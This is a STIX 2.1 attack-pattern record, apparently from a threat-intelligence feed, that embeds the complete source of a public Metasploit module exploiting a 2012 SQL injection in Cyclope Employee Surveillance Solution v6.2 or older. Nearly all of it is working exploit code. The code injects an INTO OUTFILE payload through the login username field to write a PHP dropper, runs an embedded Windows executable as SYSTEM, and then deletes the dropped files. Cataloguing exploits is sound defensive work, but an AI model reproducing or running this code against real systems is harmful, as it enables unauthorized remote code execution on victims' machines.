{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79bcecca-e18c-4876-948f-f6b5c381fb33",
    "created": "2024-08-14T16:52:42.666399Z",
    "modified": "2024-08-14T16:52:42.666403Z",
    "name": "\"Cyclope Employee Surveillance Solution v6 SQL Injection\"",
    "description": " This module exploits a SQL injection found in Cyclope Employee Surveillance Solution.  Because the login script does not properly handle the user-supplied username parameter, a malicious user can manipulate the SQL query, and allows arbitrary code execution under the context of 'SYSTEM'.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/cyclope_ess_sqli.rb",
            "external_id": "cyclope_ess_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Cyclope Employee Surveillance Solution v6 SQL Injection\",\n      'Description'    => %q{\n        This module exploits a SQL injection found in Cyclope Employee Surveillance\n        Solution.  Because the login script does not properly handle the user-supplied\n        username parameter, a malicious user can manipulate the SQL query, and allows\n        arbitrary code execution under the context of 'SYSTEM'.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'loneferret', #Original discovery, PoC\n          'sinn3r'      #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '84517'],\n          ['EDB', '20393']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Cyclope Employee Surveillance Solution v6.2 or older', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('RPORT',     [true, \"The web application's port\", 7879]),\n        OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    peer = \"#{rhost}:#{rport}\"\n    path = File.dirname(\"#{target_uri.path}/.\")\n    b64_version = get_version(path)\n    if b64_version.empty?\n      vprint_error(\"Unable to determine the version number\")\n    else\n      b64_version = Rex::Text.decode_base64(b64_version)\n      if b64_version =~ /^[0-6]\\.1/\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def get_version(path)\n    res = send_request_raw({'uri'=> \"#{path}index.php\"})\n    return '' if not res\n\n    v = res.body.scan(/\\<link rel\\=\\\"stylesheet\\\" type\\=\\\"text\\/css\\\" href\\=\\\"([\\w\\=]+)\\/css\\/.+\\\" \\/\\>/).flatten[0]\n    return '' if not v\n\n    return v\n  end\n\n\n  def on_new_session(cli)\n    if cli.type != 'meterpreter'\n      print_error(\"Please remember to manually remove #{@exe_fname} and #{@php_fname}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_warning(\"Deleting #{@php_fname}\")\n      cli.fs.file.rm(@php_fname)\n    rescue ::Exception => e\n      print_error(\"Please note: #{@php_fname} is stil on disk.\")\n    end\n\n    begin\n      print_warning(\"Deleting #{@exe_fname}\")\n      cli.fs.file.rm(@exe_fname)\n    rescue ::Exception => e\n      print_error(\"Please note: #{@exe_fname} is still on disk.\")\n    end\n  end\n\n\n  def get_php_payload(fname)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n    php = %Q|\n    <?php\n    $f = fopen(\"#{fname}\", \"wb\");\n    fwrite($f, base64_decode(\"#{p}\"));\n    fclose($f);\n    exec(\"#{fname}\");\n    ?>\n    |\n    php = php.gsub(/^ {4}/, '').gsub(/\\n/, ' ')\n    return php\n  end\n\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n    path = File.dirname(\"#{target_uri.path}/.\")\n\n    #\n    # Need to fingerprint the version number in Base64 for the payload path\n    #\n    b64_version = get_version(path)\n    if b64_version.empty?\n      print_error(\"Unable to determine the version number\")\n      return\n    end\n\n    print_status(\"Obtained version: #{Rex::Text.decode_base64(b64_version)}\")\n\n    #\n    # Prepare our payload (naughty exe embedded in php)\n    #\n    @exe_fname = Rex::Text.rand_text_alpha(6) + '.exe'\n    @php_fname = Rex::Text.rand_text_alpha(6) + '.php'\n    php = get_php_payload(@exe_fname).unpack(\"H*\")[0]\n    sqli = \"x' or (SELECT 0x20 into outfile '/Progra~1/Cyclope/#{b64_version}/#{@php_fname}' LINES TERMINATED BY 0x#{php}) and '1'='1\"\n\n    #\n    # Inject payload\n    #\n    print_status(\"Injecting PHP payload...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => path,\n      'vars_post' => {\n        'act' => 'auth-login',\n        'pag' => 'login',\n        'username' => sqli,\n        'password' => Rex::Text.rand_text_alpha(5)\n      }\n    })\n\n    #\n    # Load our payload\n    #\n    print_status(\"Loading payload: #{path}#{b64_version}/#{@php_fname}\")\n    send_request_raw({'uri'=>\"#{path}#{b64_version}/#{@php_fname}\"})\n    if res and res.code == 404\n      print_error(\"Server returned 404, the upload attempt probably failed\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-08",
    "x_mitre_platforms": [
        "win'"
    ]
}